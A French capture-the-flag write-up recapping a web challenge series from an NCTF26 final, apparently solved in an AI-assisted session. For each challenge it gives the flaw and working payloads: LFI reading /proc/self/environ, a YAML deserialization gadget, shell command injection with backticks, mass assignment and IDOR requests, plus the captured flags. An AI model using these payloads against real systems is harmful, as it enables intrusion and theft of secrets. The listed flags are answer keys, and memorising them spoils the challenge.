# Série web `boazak--<ville>` (finale NCTF26) — récap

## Explication simple (pour le jury)

Chaque ville = **une faille web différente**, racontée en une image :

| Ville | L'image simple | Ce qu'on a fait |
|-------|----------------|-----------------|
| **agoe** | Le videur vérifie seulement la **1ʳᵉ personne** de la file | On demande nos données **puis** celles de l'admin dans la même requête ; le contrôle ne regarde que la 1ʳᵉ → la note secrète de l'admin passe |
| **tsevie** | On demande un fichier, le site **ne vérifie pas lequel** | On demande un fichier système au lieu d'une note → il contient le flag |
| **akodessewa** | Le formulaire d'inscription **accepte n'importe quel champ** | On ajoute en douce « je suis admin » → on devient admin |
| **kande** | Les réglages **fusionnent** ce qu'on envoie sans vérifier | On envoie « admin = vrai » → accepté → accès admin |
| **be** | Le code source (dossier `.git`) a été **laissé en ligne** | On récupère l'historique → un `.zip` protégé y est caché → on casse son mot de passe → flag |
| **vogan** | Le serveur **lit trop naïvement** ce qu'on lui envoie (peut exécuter du code) | On le pousse à provoquer une erreur dont **le message contient le flag** |
| **atakpame** | Le serveur **colle notre texte dans une commande** | On glisse une commande cachée qui lit le fichier du flag et le réaffiche |
| **togbi** | Un **laissez-passer signé** qu'on arrive à **re-fabriquer** | On reconstruit la clé publique et on forge un laissez-passer « super-admin » |
| **mono** | Une porte de service censée être **cachée** ne l'était pas | On demande directement la page secrète `/admin-flag` → flag |

**Deux réflexes à citer :**
- Le flag est souvent rangé dans les **variables du serveur** → dès qu'on peut lire un
  fichier, on lit le fichier spécial qui les affiche.
- Quand le site ne répond rien d'utile, **un message d'erreur peut trahir le secret** (vogan).

**Les plus impressionnantes :** **togbi** (re-fabriquer un laissez-passer signé = crypto) et
**vogan** (faire parler le serveur par ses erreurs).

---

Chaque ville = une faille web distincte, instance per-team, flag rotaté.
Solve 100% en Bash/curl sur l'URL d'instance `https://<rand>.t.ctf.tg/`.

| Ville | id | Faille | Exploit | Flag (finale) |
|-------|----|--------|---------|---------------|
| agoe | 452 | Batch IDOR / BOLA | `POST /register` + `POST /login` (JWT) ; `GET /api/users?ids=[<mon_id>,1]` — l'autz ne vérifie que le 1er id → note admin (id 1) fuit | `NCTF{e3d0e63f14d63b4489f4f532}` |
| tsevie | 469 | LFI | `GET /api/note?file=/proc/self/environ` (os.path.join sans filtre, chemin absolu) → var `FLAG` | `NCTF{6af2911c862115e9327c858c}` |
| akodessewa | 454 | Mass assignment | `POST /api/register {"username","password","admin":true}` → session admin → `GET /admin` | `NCTF{69f599c438329642fbb05b4a}` |
| kande | 460 | Config merge | `POST /api/config {"admin":true}` (fusion non filtrée) → `GET /admin` | `NCTF{5cccbb9757646180a674d2c3}` |
| be | 457 | `.git` exposé | Dump objets `.git` → blob `backup.zip` (ZipCrypto STORED) → crack rockyou (mdp `chloedev`) → `flag.txt` | `NCTF{8ebb2e7dda5bc95d3011b2c3}` |
| vogan | 470 | YAML deser (RCE) | `POST /apply config=<yaml>` ; pas de reflet mais exception reflétée. `!!python/object/apply:builtins.open [!!python/object/apply:os.getenv ["FLAG"]]` → FileNotFoundError fuit le flag (env). os.system/subprocess s'exécutent mais résultat non-dict rejeté | `NCTF{3477daa63b62b83dc574cca9}` |
| atakpame | 456 | Command injection | `GET /api/process?url=&name=` → `cmd=f"wget -O /tmp/imgs/{name}.png {url}"` shell=True. `name=\`cat /flags/flag.txt >&2\`` (stderr = champ `output`). Aussi arg-injection wget via `url=--input-file=/path` | `NCTF{9db3ec32d980bd45848d898b}` |

## Notes transverses
- Flags souvent dans la var d'env `FLAG` (tsevie, vogan) OU fichier `/flags/flag.txt` world-readable (atakpame).
- Oracle d'erreur très utile quand pas de reflet (vogan : message d'exception renvoyé).
- Attention au filtrage côté grep : le flag peut être sur la même ligne que le bruit wget → lire l'output brut.
- Restants (non faits ici) : togbi (467, JWT RS256), mono (484, SSRF proxy /admin-flag), notse (466, SVG XXE), aneho (455, hard), série isid0r3 (490-497), togoville (468, Host-header reset → besoin callback).

🤖 Généré en session coordonnée (spawn via ctf-finale-bc, solve en Bash).
